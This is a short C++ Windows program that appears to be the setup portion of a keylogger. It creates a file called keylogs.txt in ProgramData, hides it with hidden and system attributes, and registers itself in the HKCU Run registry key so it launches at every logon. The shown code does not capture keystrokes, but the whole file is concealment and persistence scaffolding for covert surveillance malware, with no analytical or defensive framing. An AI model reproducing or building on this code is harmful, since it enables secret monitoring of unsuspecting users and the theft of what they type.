#include <Windows.h>
#include <iostream>
#include <fstream>
using namespace std;

fstream file;

int main()
{

	system("C: && cd C:/ProgramData/ && echo> keylogs.txt");

	system("C: && cd C:/ProgramData/ && attrib +h +s keylogs.txt");

    TCHAR exepath[MAX_PATH];
    GetModuleFileName(0, exepath, MAX_PATH);
    HKEY hKey;
    LONG lnRes = RegOpenKeyEx(
        HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE,
        &hKey
    );
    if (ERROR_SUCCESS == lnRes)
    {
        lnRes = RegSetValueEx(hKey,
            "YourProgramsName",
            0,
            REG_SZ,
            exepath,
            strlen(exepath));
    }
	return 0;
}